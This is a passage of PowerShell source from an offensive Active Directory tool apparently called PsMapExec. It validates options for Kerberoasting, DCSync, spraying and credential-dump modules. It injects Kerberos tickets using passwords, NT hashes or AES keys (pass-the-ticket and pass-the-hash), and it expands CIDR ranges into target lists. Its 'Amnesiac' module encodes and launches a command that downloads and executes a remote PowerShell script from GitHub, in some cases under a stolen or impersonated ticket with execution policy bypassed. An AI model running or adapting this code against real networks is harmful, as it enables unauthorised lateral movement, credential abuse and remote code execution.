            Write-Host "Password or hash value provided with -AccountAsPassword"
            return
        }

        elseif ($AccountAsPassword -and $EmptyPassword) {
            Write-Host
            Write-Host "[-] " -ForegroundColor Red -NoNewline
            Write-Host "Both -AccountAsPassword and -EmptyPassword provided"
            return
        }
    }

    if ($Method -eq "WinRM" -and !$DomainJoined) {
        Write-Host
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Be aware, using WinRM from a non-domain joined system typically does not work"
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "This is default and expected behaviour. This system will need to be configured as a trusted host on the remote system to allow access"
    }

    if ($Method -eq "ALL" -and ($Module -ne "" -or $Command -ne "")) {
        Write-Host
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Method ""All"" does not support command or module execution currently"
        return
    }

    if ($Method -eq "MSSQL") {
        if ($LocalAuth -and (($Username -eq "" -and $Password -ne "") -or ($Username -ne "" -and $Password -eq ""))) {
            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Looks like you are missing either -Username or -Password"
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Do not provide a -Username or -Password if you want to check with current user context"
            return
        }

        if (!$LocalAuth -and (($Username -eq "" -and $Password -ne "") -or ($Username -ne "" -and $Password -eq ""))) {
            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Looks like you are missing either -Username or -Password"
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Do not provide a -Username or -Password if you want to check with current user context"
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "You can append -LocalAuth if you wish to authenticate with a -Username and -Password as SQL Authentication"
            return
        }
    }

    # Rainbow Module Check
    if ($Rainbow) {
        if ($Module -ne "Sam" -and $Module -ne "LogonPasswords" -and $Module -ne "NTDS") {
            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "The switch -Rainbow is only compatible with the Modules 'LogonPasswords', 'NTDS', and 'SAM'"
            return
        }
    }

    # Kerberoast Method Check
    if ($Method -eq "Kerberoast") {
        if ($Module -ne "") {
            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Incorrect parameters for -Method Kerberoast"
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Example:  PsMapExec -Method Kerberoast"
            return
        }
    }

    if ($Method -eq "DCSync") {
        if ($Targets -match '^[0-9./]+$') {
    
            Write-Host "[-] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Use a FQDN or hostname for DCSync instead of IP"
    
            return
        }
    }

    # Check if LocalAuth conflicts with anything
    if ($LocalAuth) {
        $CurrentUser = $True
    }


    # LDAP / LDAPS pre-flight checks

    if ($Method -eq "LDAPS") {
        $LDAPS = $true 
    }

    else {

        $LDAPS = $false

    }

    $LDAPModules = @("whoami", "MAQ", "AddSPN", "RemoveSPN", "AddToGroup", "RemoveFromGroup", "ToggleAccount", "ResetPassword", "AddComputer", "RemoveComputer", "Elevate")

    if ($LDAPModules -contains $Module -and $Method -notin @("LDAP", "LDAPS")) {
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Module '$Module' requires LDAP (PsMapExec LDAP -Targets DC01 -Module $Module)"
        return
    }

    if (@("AddRBCD", "RemoveRBCD", "AddSPN", "RemoveSPN", "AddToGroup", "RemoveFromGroup", "ToggleAccount", "ResetPassword", "RemoveComputer", "Elevate") -contains $Module -and !$TargetDN) {
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Module '$Module' requires -TargetDN (Specify target DN)"
        return
    }

    if (@("AddToGroup", "RemoveFromGroup") -contains $Module -and !$GroupDN) {
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Module '$Module' requires -GroupDN (Specify group DN)"
        return
    }

    if ($Module -eq "AddRBCD" -and !$SID) {
        Write-Host "[*] " -ForegroundColor Yellow -NoNewline
        Write-Host "A SID is required to grant rights to ""-SID S-1-5-21-13999771-..."""
        return
    }



    ################################################################################################################
    ########################################### Current User Ticket ################################################
    ################################################################################################################

    # Check if the current user is an administrator, used for ticket functions
    $CheckAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

    function GetCurrentUserTicket {
        $Local:ErrorActionPreference = "SilentlyContinue"
    
        #Invoke-Expression -Command $Global:rbs

        if ($Method -ne "RDP") {
            if ($Method -ne "MSSQL") {
                if (!$Global:SkipRestoreTicket) {
                    if ($Klist) {
                        try {
                            Write-Log -Message  "Attempting to obtain current user ticket"
                            if ($DomainController -ne "") {
                                $BaseTicket = Invoke-rTickets send /domain:$domain /dc:$DomainController /nowrap | Out-String
                                Write-Log -Message  "[GUCT] (1) "
                            }
                            else {
                                $BaseTicket = Invoke-rTickets send /nowrap /domain:$domain | Out-String
                                Write-Log -Message  "[GUCT] (2) "
                            }

                            # Inner try block to handle specific conditions
                            try {
                                if ($BaseTicket -like "*No target SPN specified*") {
                                    Write-Log -Message  "[GUCT] Error, trying a different method"
                                    throw
                                }
                            }
                            catch {
                                # Re-throw the exception to be caught by the outer catch
                                throw
                            }

                            $Global:OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
                            Write-Log -Message  "[GUCT] (3) "
                        }
                        catch {
                            # This is the first (outer) catch block where the exception is ultimately handled
                            if (!$CheckAdmin) {
                                $BaseTicket = Invoke-rTickets get /service:krbtgt /nowrap | Out-String
                                $Global:OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
                                Write-Log -Message  "[GUCT] (4) "

                                if ($Global:OriginalUserTicket -notlike "doI*") {
                                    Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
                                    Write-Host "Unable to retrieve any Kerberos tickets"
                                    break
                                }
                            }
                            elseif ($CheckAdmin) {
                                $BaseTicket = Invoke-rTickets get /service:krbtgt /username:$env:username /nowrap | Out-String
                                $Global:OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
                                Write-Log -Message  "[GUCT] (5) "

                                if ($Global:OriginalUserTicket -notlike "doI*") {
                                    Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
                                    Write-Host "Unable to retrieve any Kerberos tickets" -ForegroundColor "Red"
                                    break
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    ################################################################################################################
    ################################################# Function: RestoreTicket ######################################
    ################################################################################################################

    function RestoreTicket {

        # Skip function execution if credentials are invalid or the global skip condition is set.
        if (-not $InvalidCredentials) {
            if ($Method -eq "Inject") {
                $Global:SkipRestoreTicket = $true
            }

            if ($Global:SkipRestoreTicket) {
                Write-Log -Message  "[Function: RestoreTicket] Skipping RestoreTicket function as per global condition."
                $Global:SkipRestoreTicket = $false  # Reset the global variable immediately after use
                return
            }
        }

        # Execute the main logic only if there's no current user context
        if (-not $CurrentUser) {
            Write-Log -Message  ""
            Write-Log -Message  "[Function: RestoreTicket] Restoring Ticket"
            klist purge | Out-Null  # Purge tickets for both conditions
            Start-Sleep -Milliseconds 100
        
            if ($DomainController) {
                Invoke-rTickets ptt /ticket:$Global:OriginalUserTicket /dc:$DomainController | Out-Null
            }
            else {
                Invoke-rTickets ptt /ticket:$Global:OriginalUserTicket | Out-Null
            }
        }
    }

    ################################################################################################################
    ########################################### Ticket processing ##################################################
    ################################################################################################################

    function ReplicateCasing {
        param ([string]$Username, [string]$Domain)

        $searcher = [System.DirectoryServices.DirectorySearcher]"LDAP://$Domain"
        $searcher.Filter = "(&(objectClass=user)(sAMAccountName=$Username))"
        $searcher.PropertiesToLoad.AddRange(@("sAMAccountName"))

        $user = $searcher.FindOne()
        if ($user) {
            return $user.Properties["sAMAccountName"][0].ToString()
        }

        else { return $Username }
    }


    
    function ProcessTicket {
    
        Write-Host
    
        if ($Method -ne "RDP") {
        
            # Check if a ticket has been provided
            if ($Ticket -ne "") {
                if ($Ticket -and (Test-Path -Path $Ticket -PathType Leaf)) {
                    $Ticket = Get-Content -Path $Ticket -Raw
                }

                $ProvidedTicket = Invoke-rTickets explain /ticket:$Ticket
            
                # Check if an error has occurred
                if ($ProvidedTicket -like "*/ticket:X*") {
                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                    Write-Host "Invalid ticket provided"
                    break
                }
            
                elseif ($ProvidedTicket -like "*Asn1.AsnException: value overflow*") {
                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                    Write-Host "Invalid ticket provided"
                    break
                }

                # Use regular expressions to extract ticket information
                $TicketUsername = [regex]::Match($ProvidedTicket, "UserName\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
                $TicketRealm = [regex]::Match($ProvidedTicket, "UserDomain\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
                $TicketExpiry = [regex]::Match($ProvidedTicket, "End\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
                $TicketType = [regex]::Match($ProvidedTicket, "NameService\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value

                # Display the extracted information
                Write-Host
                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                Write-Host "Supplied Ticket Details"

                if ($TicketType -like "krbtgt/*") { Write-Host "    - Type     : TGT" }
                if ($TicketType -notlike "krbtgt/*") { Write-Host "    - Type     : TGS" }

                Write-Host "    - UserName : $TicketUsername"
                Write-Host "    - Realm    : $TicketRealm"
                Write-Host "    - Expires  : $TicketExpiry"

                # Attempt to inject the ticket into the current session
                if ($DomainController -ne "") {
                    $InjectTicket = Invoke-rTickets ptt /ticket:$Ticket /domain:$Domain /dc:$DomainController
                }
                else {
                    $InjectTicket = Invoke-rTickets ptt /ticket:$Ticket /domain:$Domain
                }

                if ($InjectTicket -like "*Error 1398*") {
                    Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                    Write-Host "Ticket expired"
                    klist purge | Out-Null
                    RestoreTicket
                
                    break
                }
            }





            elseif ($Password -ne "") {
                $Username = ReplicateCasing -Username $Username -Domain $Domain
                klist purge | Out-Null

                if ($UserDomain -ne "") {
                    if ($DomainController -ne "") {
                        $AskPassword = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /password:$Password /dc:$DomainController /opsec /force /ptt
                    }
                    else {
                        $AskPassword = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /password:$Password /opsec /force /ptt

                    }
                }
                elseif ($UserDomain -eq "") {
                    if ($DomainController -ne "") {
                        $AskPassword = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /password:$Password /dc:$DomainController /opsec /force /ptt
                    }
                    else {
                        $AskPassword = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /password:$Password /opsec /force /ptt
                    }
                }

                Write-Log -Message  $AskPassword

                if ($AskPassword -like "*KDC_ERR_PREAUTH_FAILED*") {
                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                    Write-Host "Incorrect password or username"
                    $InvalidCredentials = $true
                    klist purge | Out-Null
                    RestoreTicket
                
                    break
                }

                if ($AskPassword -like "*NOWN*") {
                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                    Write-Host "Principal not found"
                    $InvalidCredentials = $true
                    klist purge | Out-Null
                    RestoreTicket
                
                    break
                }

                if ($AskPassword -like "*NOTSUPP*") {
                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                    Write-Host "RC4 not supported in domain or for this account"
                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                    Write-Host "Try using -Password [Password] or -Hash [AES256] instead"
                    $InvalidCredentials = $true
                    klist purge | Out-Null
                    RestoreTicket
                
                    break
                }

                if ($AskPassword -like "*Unhandled rTickets exception:*") {
                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                    Write-Host "Incorrect password or username"
                    $InvalidCredentials = $true
                    klist purge | Out-Null
                    RestoreTicket
                
                    break
                }

                if ($AskPassword -like "*Supplied encyption key type is rc4_hmac but AS-REP contains data encrypted with aes256_cts_hmac_sha1*") {
                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                    Write-Host "The encryption key is rc4_hmac, but the AS-REP uses aes256_cts_hmac_sha1 (Preauth Error)"
                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                    Write-Host "Try with a AES256 hash instead"
                    klist purge | Out-Null
                    RestoreTicket
                
                    break
                }
            } 
        
            elseif ($Hash -ne "") {
                $Username = ReplicateCasing -Username $Username -Domain $Domain
                
                if ($Hash.Length -eq 32) {
                    klist purge | Out-Null
                    Write-Log -Message  "Type Hash:32"

                    if ($UserDomain -ne "") {
                        if ($DomainController -ne "") {
                            $AskRC4 = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /dc:$DomainController /rc4:$Hash /opsec /force /ptt
                        }
                        else {
                            $AskRC4 = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /rc4:$Hash /opsec /force /ptt
                        }
                    }
                    if ($UserDomain -eq "") {
                        if ($DomainController -ne "") {
                            $AskRC4 = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /dc:$DomainController /rc4:$Hash /opsec /force /ptt
                        }
                        else {
                            $AskRC4 = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /rc4:$Hash /opsec /force /ptt
                        }
                    }

                    Write-Log -Message  $AskRC4

                    if ($AskRC4 -like "*KDC_ERR_PREAUTH_FAILED*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Incorrect hash or username"
                        $InvalidCredentials = $true
                        klist purge | Out-Null
                        RestoreTicket
                    
                        break
                    }

                    if ($AskRC4 -like "*NOWN*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Principal not found"
                        $InvalidCredentials = $true
                        klist purge | Out-Null
                        RestoreTicket
                
                        break
                    }

                    if ($AskRC4 -like "*NOTSUPP*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "RC4 not supported in domain or for this account"
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Try using -Password [Password] or -Hash [AES256] instead"
                        $InvalidCredentials = $true
                        klist purge | Out-Null
                        RestoreTicket
                
                        break
                    }

                    if ($AskRC4 -like "*Unhandled rTickets exception:*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Incorrect hash or username"
                        $InvalidCredentials = $true
                        klist purge | Out-Null
                        RestoreTicket
                        
                        break
                    }
                
                    if ($AskRC4 -like "*Supplied encyption key type is rc4_hmac but AS-REP contains data encrypted with aes256_cts_hmac_sha1*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "The encryption key is rc4_hmac, but the AS-REP uses aes256_cts_hmac_sha1 (Preauth Error)"
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Try with a AES256 hash instead"
                        klist purge | Out-Null
                        RestoreTicket
                
                        break
                    }
                }
                elseif ($Hash.Length -eq 64) {
                    klist purge | Out-Null
                    Write-Log -Message  "Type Hash:64"

                    if ($UserDomain -ne "") {
                        if ($DomainController -ne "") {
                            $Ask256 = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /dc:$DomainController /aes256:$Hash /opsec /force /ptt
                        }
                        else {
                            $Ask256 = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /aes256:$Hash /opsec /force /ptt
                        }
                    }
                    elseif ($UserDomain -eq "") {
                        if ($DomainController -ne "") {
                            $Ask256 = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /dc:$DomainController /aes256:$Hash /opsec /force /ptt
                        }
                        else {
                            $Ask256 = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /aes256:$Hash /opsec /force /ptt
                        }
                    }

                    Write-Log -Message  $Ask256

                    if ($Ask256 -like "*KDC_ERR_PREAUTH_FAILED*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Incorrect hash or username"
                        $InvalidCredentials = $true
                        klist purge | Out-Null
                        RestoreTicket
                    
                        break
                    }

                    if ($Ask256 -like "*NOWN*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Principal not found"
                        $InvalidCredentials = $true
                        klist purge | Out-Null
                        RestoreTicket
                
                        break
                    }

                    if ($Ask256 -like "*NOTSUPP*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "RC4 not supported in domain or for this account"
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Try using -Password [Password] or -Hash [AES256] instead"
                        $InvalidCredentials = $true
                        klist purge | Out-Null
                        RestoreTicket
                
                        break
                    }

                    if ($Ask256 -like "*Unhandled rTickets exception:*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Incorrect hash or username"
                        $InvalidCredentials = $true
                        klist purge | Out-Null
                        RestoreTicket
                    
                        break
                    }

                    if ($Ask256 -like "*Supplied encyption key type is rc4_hmac but AS-REP contains data encrypted with aes256_cts_hmac_sha1*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "The encryption key is rc4_hmac, but the AS-REP uses aes256_cts_hmac_sha1 (Preauth Error)"
                        klist purge | Out-Null
                        RestoreTicket
                
                        break
                    }

                
                
                }
                elseif ($Hash.Length -eq 65) {
                    $colonCount = ($Hash.ToCharArray() | Where-Object { $_ -eq ':' }).Count
                    
                    if ($colonCount -ne 1) {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Ensure the provided value for the NTLM hash is formed as LM:NT"
                        Write-Host "Example: aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe"
                        break
                    }
                
                    $Hash = $Hash.Split(':')[1]

                    klist purge | Out-Null
                    Write-Log -Message  "Type Hash:65"
                
                    if ($UserDomain -ne "") {
                        if ($DomainController -ne "") {
                            $AskRC4 = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /dc:$DomainController /rc4:$Hash /opsec /force /ptt
                        }
                        else {
                            $AskRC4 = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /rc4:$Hash /opsec /force /ptt
                        }
                    }
                    if ($UserDomain -eq "") {
                        if ($DomainController -ne "") {
                            $AskRC4 = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /dc:$DomainController /rc4:$Hash /opsec /force /ptt
                        }
                        else {
                            $AskRC4 = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /rc4:$Hash /opsec /force /ptt
                        }
                    }
                
                    Write-Log -Message  $AskRC4
                
                    if ($AskRC4 -like "*KDC_ERR_PREAUTH_FAILED*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Incorrect hash or username"
                        $InvalidCredentials = $true
                        klist purge | Out-Null
                        RestoreTicket
                    
                        break
                    }

                    if ($AskRC4 -like "*NOWN*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Principal not found"
                        $InvalidCredentials = $true
                        klist purge | Out-Null
                        RestoreTicket
                
                        break
                    }

                    if ($AskRC4 -like "*NOTSUPP*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "RC4 not supported in domain or for this account"
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Try using -Password [Password] or -Hash [AES256] instead"
                        $InvalidCredentials = $true
                        klist purge | Out-Null
                        RestoreTicket
                
                        break
                    }
                
                    if ($AskRC4 -like "*Unhandled rTickets exception:*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Incorrect hash or username"
                        $InvalidCredentials = $true
                        klist purge | Out-Null
                        RestoreTicket
                        
                        break
                    }
                
                    if ($AskRC4 -like "*Supplied encyption key type is rc4_hmac but AS-REP contains data encrypted with aes256_cts_hmac_sha1*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "The encryption key is rc4_hmac, but the AS-REP uses aes256_cts_hmac_sha1 (Preauth Error)"
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Try with a AES256 hash instead of NTLM"
                        klist purge | Out-Null
                        RestoreTicket
                
                        break
                    }
                }
                else {
                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                    Write-Host "Supply either a 32-character RC4/NT hash, 64-character AES256 hash or a NTLM hash"
                    Write-Host 
                    Write-Host
                
                    break
                }

            }
        }

        if ($Method -eq "Inject") {
            Write-Log -Message  "[Function: ProcessTicket] Injecting Ticket"
            RestoreTicket
            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
            Write-host "Ticket Successfuly Injected"
            break
        }
    }

    ################################################################################################################
    ############################################## Load Amnesiac ###################################################
    ################################################################################################################

    if ($Module -eq "Amnesiac") {
        if ([string]::IsNullOrEmpty($Global:AmnesiacPID) -or (Get-Process -Id $Global:AmnesiacPID -ErrorAction SilentlyContinue) -eq $null) {
            $Global:PN = $null
            $Global:PN = ((65..90) + (97..122) | Get-Random -Count 16 | ForEach-Object { [char]$_ }) -join ''
        
            if (!$Global:SID) {
                $Global:SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
            }
        
            $finalcommand = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Amnesiac.ps1');Amnesiac -ScanMode -GlobalPipeName $PN"
            $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($finalcommand))

            if (!$CurrentUser) {
                Write-Log -Message  "Starting Amnesiac with impersonation"
                GetCurrentUserTicket
                $process = Invoke-rTickets startonlynet /program:"c:\windows\system32\cmd.exe /c powershell.exe -noexit -NoProfile -EncodedCommand $encodedCommand" /username:$env:Username /password:Fakepass /domain:$Domain /show /ptt /ticket:$Global:OriginalUserTicket
                Write-Log $Process
                Write-Log ""
                $pattern = "\sProcessID\s+:\s+(\d+)"
            
                # Find the created process ID
                $match = [regex]::Match($process, $pattern)
                if ($match.Success) {
                    $Global:AmnesiacPID = $match.Groups[1].Value
                } 
            }
        
            if ($CurrentUser) {
                Write-Log -Message  "Starting Amnesiac without impersonation"
                $process = Start-Process cmd.exe -ArgumentList "/c powershell.exe -ep bypass -c `"IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Amnesiac.ps1'); Amnesiac -ScanMode -GlobalPipeName $PN`"" -PassThru
                $Global:AmnesiacPID = $process.Id
            }
        }
        else {
            Write-Log -Message  "Amnesiac is already running"
            if ($Scramble) { $Global:PN = ((65..90) + (97..122) | Get-Random -Count 16 | ForEach-Object { [char]$_ }) -join '' }
            elseif ((Get-Process -Id $Global:AmnesiacPID -ErrorAction SilentlyContinue) -ne $null) {
                $Global:PN = $Global:PN
            }
            else {
                $Global:AmnesiacPID = $null
            }
        }
    }

    ################################################################################################################
    ######################################### Console Display variables ############################################
    ################################################################################################################

    function Resolve-DnsNameWithTimeout {
        param(
            [string]$IPAddress,
            [int]$Timeout
        )
        if ($Method -eq "IPMI") { Write-Host ("{0}" -f "") -NoNewline ; return }
        try {
            $timeoutTask = [timespan]::FromMilliseconds($Timeout)
            $task = [System.Net.Dns]::GetHostEntryAsync($IPAddress)

            $sw = [System.Diagnostics.Stopwatch]::StartNew()

            if ($task.Wait($timeoutTask)) {
                $sw.Stop() # Stop the stopwatch
                Write-Host ("{0,-44}" -f $($task.Result.HostName)) -NoNewline
            }
            else {
                $sw.Stop()
                Write-Host ("{0,-44}" -f "") -NoNewline
            }
        }
        catch {
            Write-Host ("{0,-44}" -f "") -NoNewline
        } 
    }
    
    function Display-ComputerStatus {
        param (
            [string]$ComputerName,
            [string]$OS,
            [System.ConsoleColor]$statusColor = 'White',
            [string]$statusSymbol = "",
            [string]$statusText = "",
            [int]$NameLength,
            [int]$OSLength,
            [string]$successfulProtocols
        )

        # Prefix
        switch ($Method) {
            "DCSync" { Write-Host "DCSync" -ForegroundColor "Yellow" -NoNewline }
            "LDAP" { Write-Host "LDAP" -ForegroundColor "Yellow" -NoNewline }
            "LDAPS" { Write-Host "LDAPS" -ForegroundColor "Yellow" -NoNewline }
            "SMB" { Write-Host "SMB" -ForegroundColor "Yellow" -NoNewline }
            "WMI" { Write-Host "WMI" -ForegroundColor "Yellow" -NoNewline }
            "WinRM" { Write-Host "WinRM" -ForegroundColor "Yellow" -NoNewline }
            "All" { Write-Host "ALL" -ForegroundColor "Yellow" -NoNewline }
            "GenRelayList" { Write-Host "GenRelayList" -ForegroundColor "Yellow" -NoNewline }
            "SessionHunter" { Write-Host "SessionHunter" -ForegroundColor "Yellow" -NoNewline }
            "VNC" { Write-Host "VNC" -ForegroundColor "Yellow" -NoNewline }
            "IPMI" { Write-Host "IPMI" -ForegroundColor "Yellow" -NoNewline }
        }
    
        Write-Host "   " -NoNewline

        if (!$IPAddress) {
            # Resolve IP
            $IP = $null
            $Ping = New-Object System.Net.NetworkInformation.Ping
            $Result = $Ping.Send($ComputerName, 15)
            if ($Result.Status -eq 'Success') {
                $IP = $Result.Address.IPAddressToString
                Write-Host ("{0,-16}" -f $IP) -NoNewline
            }
            else {
                Write-Host ("{0,-16}" -f $IP) -NoNewline
            }
        }
        elseif ($IPAddress) {

            Resolve-DnsNameWithTimeout -IPAddress $ComputerName -Timeout 5000
        }


        # IP Address in use, display nothing in column
        else {}

        # Display ComputerName and OS
        Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
        Write-Host "   " -NoNewline
        if (!$IPAddress) { Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline }
        Write-Host "   " -NoNewline

        # Display status symbol and text
        Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
        Write-Host $statusText
    }


    ################################################################################################################
    ##################################### Ticket logic for authentication ##########################################
    ################################################################################################################
    # Set the userDomain when impersonating a user in one domain for access to an alternate domain
    # Can't remember where I was going with this...
    if ($UserDomain -ne "") {}

    if (!$CurrentUser -and $Module -ne "Amnesiac") { Write-Log -Message  "Obtaining current user ticket" ; GetCurrentUserTicket }
    if (!$CurrentUser) { Write-Log -Message  "Processing ticket" ; ProcessTicket }

    ################################################################################################################
    ########################################## Domain Target Acquisition ###########################################
    ################################################################################################################

    $ComputerTargetMethods = @("SMB", "WMI", "SessionHunter", "WinRM", "RDP", "VNC", "IPMI", "MSSQL", "GenRelayList", "All", "DCSync", "LDAP", "LDAPS")
    $UserTargetMethods = @("Kerberoast", "Spray")



    function New-Searcher {
        #Write-Log -Message "Initialising New-Searcher" -Function "New-Searcher"
    
        $directoryEntry = [ADSI]"LDAP://$domain"
        $searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
        $searcher.PageSize = 1000
        $searcher.PropertiesToLoad.AddRange(@("dnshostname", "operatingSystem"))
        return $searcher
    }


    function CheckTargetTypeIPCIDR {
        param (
            [string]$Targets
        )
        Write-Log -Message "Initialising CheckTargetTypeIPCIDR " -Function "CheckTargetTypeIPCIDR"
        Write-Log -Message "Evaluating target type for $Targets" -Function "CheckTargetTypeIPCIDR"

        if ($Targets -match "^(\d{1,3}\.){3}\d{1,3}/\d{1,2}$") {
            Write-Log -Message "Target identified as CIDR" -Function "CheckTargetTypeIPCIDR"
            return "CIDR"
        }
        elseif ($Targets -match "^(\d{1,3}\.){3}\d{1,3}$") {
            Write-Log -Message "Target identified as IP address" -Function "CheckTargetTypeIPCIDR"
            return "IPAddress"
        }
        else {
            Write-Log -Message "Target identified as LDAP Query" -Function "CheckTargetTypeIPCIDR"
            return "LDAP Query"
        }
    }

    function Get-IPRange {
        param (
            [string]$Targets
        )
    
        Write-Log -Message "Initialising Get-IPRange" -Function "Get-IPRange"
        $ErrorActionPreference = "Stop"
        try {
            Write-Log -Message "Processing IP range for $Targets" -Function "Get-IPRange"
        
            if ($Targets -like "*/*") {
                # CIDR range
                $baseIP, $prefixLength = $Targets -split "/"
            
                # Validate the base IP and prefix length
                if (-not ($baseIP -match "^(\d{1,3}\.){3}\d{1,3}$") -or -not ($prefixLength -match "^\d{1,2}$") -or ([int]$prefixLength -lt 16 -or [int]$prefixLength -gt 32)) {
                    Write-Error "Invalid CIDR format or prefix length. Ensure you use a prefix between /16 and /32"
                    RestoreTicket
                }

                # Generate all IP addresses within the range
                $ipCount = [math]::Pow(2, (32 - [int]$prefixLength))
                $ipBytes = [System.Net.IPAddress]::Parse($baseIP).GetAddressBytes()
                [Array]::Reverse($ipBytes)
                $ipDecimal = [BitConverter]::ToUInt32($ipBytes, 0)
                [array]$Computers = 0..($ipCount - 1) | ForEach-Object {
                    $currentIPDecimal = $ipDecimal + $_
                    $currentIPBytes = [BitConverter]::GetBytes($currentIPDecimal)
                    [Array]::Reverse($currentIPBytes)
                    "$($currentIPBytes[0]).$($currentIPBytes[1]).$($currentIPBytes[2]).$($currentIPBytes[3])"
                }
            
                Write-Log -Message "CIDR range processed into IP addresses" -Function "Get-IPRange"
                [array]$Computers = [array]$Computers
                $LocalIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } | Select-Object -ExpandProperty IPAddress)
            
                foreach ($Address in $LocalIP) {
                    [array]$Computers = [array]$Computers | Where-Object { $_ -ne $Address }
                }
            
                $IPAddress = $true
            
            
            }
